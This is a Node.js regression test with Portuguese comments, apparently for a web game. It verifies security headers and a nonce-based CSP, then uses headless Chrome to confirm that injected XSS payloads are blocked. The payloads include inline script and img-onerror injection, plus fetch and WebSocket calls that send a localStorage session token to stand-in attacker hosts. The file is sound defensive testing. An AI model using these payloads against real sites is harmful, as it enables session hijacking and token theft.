/**
 * Confere as travas de borda: cabeçalhos, CSP e o que a CSP realmente barra.
 *
 *   npm run test:seguranca            (servidor local em :8080)
 *   node tools/teste-seguranca.mjs https://pokeidle.io
 *
 * ### Por que isto é um teste, e não uma conferência de uma vez só
 *
 * Cabeçalho de segurança é o tipo de coisa que quebra em silêncio. Ninguém abre o jogo e
 * percebe que a CSP sumiu — o jogo fica ATÉ melhor sem ela. O dia em que alguém acrescentar
 * um `<script>` sem passar pelo `injetarNonce`, ou trocar o proxy da frente, ou mexer no
 * `servirPagina`, a proteção vira enfeite e nada avisa.
 *
 * Os ataques do fim existem pelo mesmo motivo: uma CSP com `'unsafe-inline'` efetivo passa em
 * qualquer conferência de "o cabeçalho está lá?" e não protege de nada. O que se testa aqui é
 * o COMPORTAMENTO — o payload roda ou não roda.
 */
import { spawn } from 'node:child_process';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { existsSync } from 'node:fs';
import WebSocket from 'ws';

const ORIGEM = (process.argv[2] ?? 'http://localhost:8080').replace(/\/+$/, '');
// O TRACKER entra aqui, e não só no `teste-tracker.mjs`: esta é a lista que garante que TODA
// página do site leva a CSP com nonce e os cabeçalhos de borda. Página nova que não entre nela
// passa a existir sem ninguém conferir se a proteção veio junto.
const PAGINAS = ['/', '/app', '/terms', '/admin', '/tracker'];

/** Os que TÊM de estar em toda resposta. O HSTS fica de fora: só existe sob HTTPS. */
const OBRIGATORIOS = [
  'x-content-type-options',
  'x-frame-options',
  'referrer-policy',
  'permissions-policy',
];

/** As diretivas que a CSP da página não pode perder. */
const DIRETIVAS = [
  'default-src', 'script-src', 'object-src', 'base-uri', 'frame-ancestors', 'form-action',
  'connect-src',
];

let falhas = 0;
const erro = (msg) => { falhas++; console.log(`  [X] ${msg}`); };
const ok = (msg) => console.log(`  [ok] ${msg}`);

// ----------------------------------------------------------------- cabeçalhos

console.log('\nCabeçalhos');
for (const rota of [...PAGINAS, '/estilo.css', '/saude']) {
  const r = await fetch(ORIGEM + rota, { redirect: 'manual' });
  const faltando = OBRIGATORIOS.filter((h) => !r.headers.get(h));
  if (faltando.length) erro(`${rota}: sem ${faltando.join(', ')}`);
  else ok(`${rota}`);

  if (ORIGEM.startsWith('https://') && !r.headers.get('strict-transport-security')) {
    erro(`${rota}: HTTPS e sem strict-transport-security`);
  }
}

// ------------------------------------------------------------------- a CSP

console.log('\nCSP das páginas');
for (const rota of PAGINAS) {
  const r = await fetch(ORIGEM + rota, { redirect: 'manual' });
  const politica = r.headers.get('content-security-policy') ?? '';
  const html = await r.text();

  if (!politica) { erro(`${rota}: sem Content-Security-Policy`); continue; }

  const faltando = DIRETIVAS.filter((d) => !politica.includes(`${d} `));
  if (faltando.length) { erro(`${rota}: CSP sem ${faltando.join(', ')}`); continue; }

  // O nonce do cabeçalho tem de estar em TODA tag <script> do corpo. Uma sem nonce é uma tag
  // que não vai rodar em produção — e que passaria despercebida até alguém reclamar.
  const nonce = politica.match(/'nonce-([^']+)'/)?.[1];
  if (!nonce) { erro(`${rota}: CSP sem nonce`); continue; }

  const tags = html.match(/<script(?=[\s>])[^>]*>/gi) ?? [];
  const semNonce = tags.filter((t) => !t.includes(`nonce="${nonce}"`));
  if (semNonce.length) { erro(`${rota}: ${semNonce.length} <script> sem o nonce`); continue; }

  // `no-store` é o que impede um 304 de casar corpo velho (nonce velho) com cabeçalho novo.
  if (!/no-store/.test(r.headers.get('cache-control') ?? '')) {
    erro(`${rota}: página com nonce precisa de cache-control no-store`);
    continue;
  }
  ok(`${rota} — ${tags.length} <script>, todos com nonce`);
}

// ------------------------------------------------- o que a CSP barra de verdade

const CHROMES = [
  'C:/Program Files/Google/Chrome/Application/chrome.exe',
  'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe',
  'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe',
  '/usr/bin/google-chrome',
  '/usr/bin/chromium',
];
const chrome = CHROMES.find((c) => existsSync(c));
if (!chrome) {
  console.log('\n[aviso] Chrome/Edge não encontrado — pulei os testes de navegador.');
} else {
  console.log('\nNo navegador');
  const perfil = await mkdtemp(join(tmpdir(), 'seg-'));
  const porta = 9300 + Math.floor(Math.random() * 400);
  const proc = spawn(chrome, ['--headless=new', '--disable-gpu', '--no-sandbox',
    `--remote-debugging-port=${porta}`, `--user-data-dir=${perfil}`, 'about:blank'],
    { stdio: 'ignore', windowsHide: true });
  const dormir = (ms) => new Promise((r) => setTimeout(r, ms));

  try {
    let alvo;
    for (let i = 0; i < 60 && !alvo; i++) {
      try {
        const lista = await (await fetch(`http://127.0.0.1:${porta}/json/list`)).json();
        alvo = lista.find((p) => p.type === 'page');
      } catch { await dormir(250); }
    }
    if (!alvo) throw new Error('Chrome não subiu');

    const ws = new WebSocket(alvo.webSocketDebuggerUrl, { maxPayload: 64 * 1024 * 1024 });
    await new Promise((r) => ws.on('open', r));
    let id = 0;
    const pend = new Map();
    const violacoes = [];
    ws.on('message', (raw) => {
      const m = JSON.parse(raw);
      if (m.id && pend.has(m.id)) { pend.get(m.id)(m.result); pend.delete(m.id); return; }
      if (m.method === 'Log.entryAdded'
          && /content security policy|refused to/i.test(m.params.entry.text ?? '')) {
        violacoes.push(m.params.entry.text.slice(0, 200));
      }
    });
    const cmd = (method, params = {}) => new Promise((r) => {
      const i = ++id; pend.set(i, r); ws.send(JSON.stringify({ id: i, method, params }));
    });

    await cmd('Log.enable');
    await cmd('Runtime.enable');
    await cmd('Page.enable');

    // 1) O jogo carrega inteiro, sem NENHUMA violação. Uma CSP que quebra o jogo seria
    //    revertida no primeiro relato — então "não quebrou" faz parte do teste.
    for (const rota of PAGINAS) {
      const antes = violacoes.length;
      await cmd('Page.navigate', { url: ORIGEM + rota });
      await dormir(5000);
      const novas = violacoes.slice(antes);
      if (novas.length) {
        erro(`${rota}: ${novas.length} violação(ões) de CSP com o jogo normal`);
        for (const v of new Set(novas)) console.log(`       ${v}`);
      } else ok(`${rota} carrega sem violação`);
    }

    // 2) O jogo e as tags de marketing REALMENTE subiram — sem isto, "zero violações" também
    //    seria o resultado de uma página em branco.
    await cmd('Page.navigate', { url: `${ORIGEM}/app` });
    await dormir(6000);
    const vivo = JSON.parse((await cmd('Runtime.evaluate', {
      expression: `JSON.stringify({
        botoes: document.querySelectorAll('button').length,
        erro: (document.querySelector('#login-erro')||{}).textContent || '',
        gtm: Array.isArray(window.dataLayer), pixel: typeof window.fbq === 'function',
      })`,
      returnByValue: true,
    })).result.value);
    if (vivo.botoes < 10 || vivo.erro) erro(`o cliente não montou (${JSON.stringify(vivo)})`);
    else ok(`cliente montou (${vivo.botoes} botões, sem erro de módulo)`);
    if (!vivo.gtm || !vivo.pixel) erro(`tag de marketing bloqueada: ${JSON.stringify(vivo)}`);
    else ok('GTM e Meta Pixel carregaram');

    // 3) E agora o que importa: os payloads de XSS não podem rodar.
    const ataque = `(async () => {
      window.__roubado = false;
      const d1 = document.createElement('div');
      d1.innerHTML = '<scr' + 'ipt>window.__roubado = "script-inline"</scr' + 'ipt>';
      document.body.appendChild(d1);
      const d2 = document.createElement('div');
      d2.innerHTML = '<img src=x onerror="window.__roubado = \\'onerror\\'">';
      document.body.appendChild(d2);
      let exfil = 'bloqueado';
      try {
        fetch('https://exemplo-atacante.invalid/x?t=' + localStorage.getItem('sessao'))
          .then(() => { exfil = 'PASSOU'; }).catch(() => {});
      } catch (e) { exfil = 'bloqueado'; }

      // O MESMO roubo, trocando só o transporte. Era por aqui que o \`connect-src\` com os
      // curingas \`ws: wss:\` deixava a política inteira ser contornada: o \`fetch\` batia na
      // trava e o WebSocket passava, levando o token junto no endereço.
      //
      // Quem dá o veredito é o evento \`securitypolicyviolation\`, e não o construtor: o
      // navegador NÃO estoura ao barrar um WebSocket — ele deixa o construtor passar e derruba
      // a conexão depois. Olhar só o \`try/catch\` diria "bloqueado" nos dois mundos, e o teste
      // passaria justamente onde devia falhar (foi o que aconteceu na primeira versão disto).
      // Pelo mesmo motivo não dá para olhar o \`onerror\`: \`.invalid\` nunca resolve e erra
      // de qualquer jeito.
      // O alvo do socket é um domínio DIFERENTE do alvo do \`fetch\` de propósito: o \`fetch\`
      // acima também é barrado, e a violação dele traz o mesmo domínio no \`blockedURI\` —
      // casar só pelo nome dava "bloqueado" aqui mesmo com o curinga aberto.
      let exfilWs = 'PASSOU';
      document.addEventListener('securitypolicyviolation', (e) => {
        if (String(e.blockedURI || '').startsWith('wss://socket-atacante')) exfilWs = 'bloqueado';
      });
      try {
        new WebSocket('wss://socket-atacante.invalid/?t=' + localStorage.getItem('sessao'));
      } catch (e) { exfilWs = 'bloqueado'; }

      // E o socket do PRÓPRIO jogo tem de continuar abrindo — é o risco desta trava, e o
      // único jeito de saber é abrindo um de verdade contra o servidor do teste.
      const proprio = await new Promise((r) => {
        let feito = false;
        const fim = (v) => { if (!feito) { feito = true; r(v); } };
        try {
          const s = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host);
          s.onopen = () => { s.close(); fim('abriu'); };
          s.onerror = () => fim('erro de rede');
          setTimeout(() => fim('sem resposta em 3s'), 3000);
        } catch (e) { fim('BLOQUEADO pela CSP: ' + e.name); }
      });

      await new Promise((r) => setTimeout(r, 2500));
      return JSON.stringify({ roubado: window.__roubado, exfil, exfilWs, proprio });
    })()`;
    const res = JSON.parse((await cmd('Runtime.evaluate', {
      expression: ataque, awaitPromise: true, returnByValue: true,
    })).result.value);
    if (res.roubado) erro(`payload de XSS EXECUTOU (${res.roubado}) — a CSP não está segurando`);
    else ok('<script> injetado e handler inline: bloqueados');
    if (res.exfil !== 'bloqueado') erro('exfiltração do token para domínio externo PASSOU');
    else ok('exfiltração do token para fora (fetch): bloqueada por connect-src');
    if (res.exfilWs !== 'bloqueado') {
      erro('exfiltração do token por WEBSOCKET PASSOU — `connect-src` está com curinga de esquema (`ws:`/`wss:`)');
    } else ok('exfiltração do token para fora (WebSocket): bloqueada por connect-src');
    if (res.proprio !== 'abriu') erro(`o socket do próprio jogo não abriu: ${res.proprio}`);
    else ok('e o socket do próprio jogo continua abrindo');

    ws.close();
  } finally {
    proc.kill();
    await rm(perfil, { recursive: true, force: true }).catch(() => {});
  }
}

console.log(falhas ? `\n${falhas} falha(s).\n` : '\nTudo certo.\n');
process.exit(falhas ? 1 : 0);
